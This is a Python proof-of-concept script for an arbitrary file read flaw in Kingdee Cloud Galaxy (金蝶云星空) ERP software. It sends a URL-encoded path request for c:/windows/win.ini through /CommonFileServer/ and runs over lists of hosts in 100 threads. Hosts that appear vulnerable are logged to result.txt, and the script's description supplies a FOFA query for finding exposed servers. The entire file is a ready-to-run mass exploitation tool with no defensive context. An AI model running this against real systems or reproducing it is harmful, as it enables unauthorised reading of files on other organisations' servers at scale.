#-*- coding: utf-8 -*-
import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = """ 
 __  _  ____  ____    ____  ___      ___    ___ 
|  |/ ]|    ||    \  /    ||   \    /  _]  /  _]
|  ' /  |  | |  _  ||   __||    \  /  [_  /  [_ 
|    \  |  | |  |  ||  |  ||  D  ||    _]|    _]
|     \ |  | |  |  ||  |_ ||     ||   [_ |   [_ 
|  .  | |  | |  |  ||     ||     ||     ||     |
|__|\_||____||__|__||___,_||_____||_____||_____|
                                                              tag : kingdee 任意文件读取漏洞 poc
                                                                             @author : Gui1de
    """
    print(test)



headers = {

    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Connection": "close"
}

def poc(target):
    if "http://" in target:
        print('请去掉"http://"后重新输入')
    else:
        url = "http://"+target+"/CommonFileServer/c%3A%2Fwindows%2Fwin.ini"
        try:
            res = requests.get(url,headers=headers,verify=False,timeout=5).text
            if "200" in res:
                print(f"[+] {target} is vulable"+res)
                print(url)
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                print(f"[-] {target} is not vulable")
        except:
            print(f"[*] {target} 请求失败")

def main():
    banner()
    parser = argparse.ArgumentParser(description='金蝶云星空 任意文件读取漏洞fofa语法:"app="金蝶云星空-管理中心""')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: www.example.com ")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()